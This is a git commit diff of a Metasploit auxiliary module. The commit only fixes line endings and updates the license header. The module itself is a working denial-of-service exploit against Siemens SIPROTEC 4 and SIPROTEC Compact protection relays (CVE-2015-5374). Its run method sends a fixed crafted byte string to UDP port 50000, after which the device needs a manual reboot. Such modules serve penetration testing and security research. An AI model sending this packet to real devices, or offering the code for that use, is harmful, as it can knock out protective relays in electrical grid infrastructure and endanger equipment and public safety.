c1dc603f0d3c898c2c5c57a9ce8e5173c34a928b
Can <0x43414e@gmail.com>
2018-03-08 19:53:18 +0100

    fixed EOLs, updated license comment
    fixed EOLs, updated license comment

--- modules/auxiliary/dos/scada/siemens_siprotec4.rb
+++ modules/auxiliary/dos/scada/siemens_siprotec4.rb
@@ -1,24 +1,21 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
- 
- 
+
 require 'msf/core'
- 
+
 class MetasploitModule < Msf::Auxiliary
- 
+
     include Msf::Exploit::Remote::Udp
     include Msf::Auxiliary::Dos
     def initialize(info = {})
-        super(update_info(info, 
+        super(update_info(info,
             'Name'           => 'Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module - Denial of Service ',
             'Description'    => %q{
-                This module sends a specially crafted packet to port 50000/UDP 
-                causing a denial of service of the affected (Siemens SIPROTEC 4 and SIPROTEC Compact < V4.25) devices. 
-                A manual reboot is required to return the device to service. 
+                This module sends a specially crafted packet to port 50000/UDP
+                causing a denial of service of the affected (Siemens SIPROTEC 4 and SIPROTEC Compact < V4.25) devices.
+                A manual reboot is required to return the device to service.
                 CVE-2015-5374 and a CVSS v2 base score of 7.8 have been assigned to this vulnerability.
                 
             },
@@ -38,14 +35,12 @@ class MetasploitModule < Msf::Auxiliary
     def run
         connect_udp
         pckt = "\x11\x49\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x9e"
-         
+     
         print_status("Sending DoS packet ... ")
          
         udp_sock.put(pckt)
          
         disconnect_udp
     end
- 
-end
- 
+end 
 # 0x43414e [2018-03-08]
